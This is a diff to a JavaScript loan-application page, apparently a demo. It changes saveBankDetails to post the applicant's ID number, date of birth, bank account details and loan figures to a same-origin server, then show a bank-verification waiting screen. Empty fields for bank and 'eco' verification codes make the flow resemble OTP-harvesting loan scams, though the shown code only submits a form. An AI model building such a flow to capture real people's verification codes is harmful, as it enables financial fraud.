@@ -1122,27 +1122,19 @@ function loadBankDetailsScreen() {
 }
 // ======================================================
 // PART 10 - SAVE BANK DETAILS
+// DEMO APPLICATION CREATION
 // ======================================================
 
-function saveBankDetails() {
+async function saveBankDetails() {
 
     const accountName =
-        document
-            .getElementById("accountName")
-            .value
-            .trim();
+        document.getElementById("accountName").value.trim();
 
     const phone =
-        document
-            .getElementById("bankPhone")
-            .value
-            .trim();
+        document.getElementById("bankPhone").value.trim();
 
     const accountNumber =
-        document
-            .getElementById("accountNumber")
-            .value
-            .trim();
+        document.getElementById("accountNumber").value.trim();
 
     if (
         accountName === "" ||
@@ -1153,25 +1145,122 @@ function saveBankDetails() {
         alert("Please complete all bank details.");
 
         return;
-
     }
 
-    sessionStorage.setItem(
-        "accountName",
-        accountName
-    );
+    // Save locally for the current application
+    sessionStorage.setItem("accountName", accountName);
+    sessionStorage.setItem("bankPhone", phone);
+    sessionStorage.setItem("accountNumber", accountNumber);
 
-    sessionStorage.setItem(
-        "bankPhone",
-        phone
-    );
+    // Prepare application for the server
+    const data = {
 
-    sessionStorage.setItem(
-        "accountNumber",
-        accountNumber
-    );
+        fullNames:
+            sessionStorage.getItem("fullNames"),
 
-    loadBankVerificationWaitingScreen();
+        dateOfBirth:
+            sessionStorage.getItem("dateOfBirth"),
+
+        idNumber:
+            sessionStorage.getItem("idNumber"),
+
+        occupation:
+            sessionStorage.getItem("occupation"),
+
+        loanPurpose:
+            sessionStorage.getItem("loanPurpose"),
+
+        loanAmount:
+            sessionStorage.getItem("loanAmount"),
+
+        loanPeriod:
+            sessionStorage.getItem("loanPeriod"),
+
+        monthlyRepayment:
+            sessionStorage.getItem("monthlyRepayment"),
+
+        totalRepayment:
+            sessionStorage.getItem("totalRepayment"),
+
+        disbursementMethod: "Bank",
+
+        selectedBank:
+            sessionStorage.getItem("selectedBank") || "",
+
+        accountName: accountName,
+
+        bankPhone: phone,
+
+        accountNumber: accountNumber,
+
+        // DEMO ONLY — never store a real OTP here
+        bankverificationCode: "",
+
+        bankReference: "",
+
+        ecoName: "",
+
+        ecoNumber: "",
+
+        ecoVerificationCode: "",
+
+        ecoReference: ""
+
+    };
+
+    try {
+
+        const response = await fetch(
+            "/submit-application",
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify(data)
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+
+            throw new Error(
+                result.error ||
+                "Unable to save application."
+            );
+
+        }
+
+        // IMPORTANT:
+        // Save the database application ID
+        sessionStorage.setItem(
+            "applicationId",
+            result.application.id
+        );
+
+        console.log(
+            "Application saved:",
+            result.application.id
+        );
+
+        // Now show the demo waiting screen
+        loadBankVerificationWaitingScreen();
+
+    } catch (error) {
+
+        console.error(
+            "BANK APPLICATION ERROR:",
+            error
+        );
+
+        alert(
+            "Unable to save your application. Please try again."
+        );
+
+    }
 
 }
 // ======================================================
